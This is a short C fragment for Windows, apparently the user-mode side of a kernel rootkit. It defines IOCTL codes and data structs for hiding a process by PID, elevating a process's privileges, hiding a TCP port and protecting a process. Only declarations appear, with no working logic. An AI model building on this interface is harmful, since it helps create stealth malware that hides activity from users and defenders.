#include <Windows.h>
#include <stdio.h>

#define IOCTL_HIDEPROC	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVATEME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0002, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDETCP	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0003, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_PROTECT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0004, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003

struct HideProcData {
	ULONG TargetPID;
};

struct ElevateData {
	ULONG TargetPID;
};

struct HideTcpData {
	ULONG Port;
};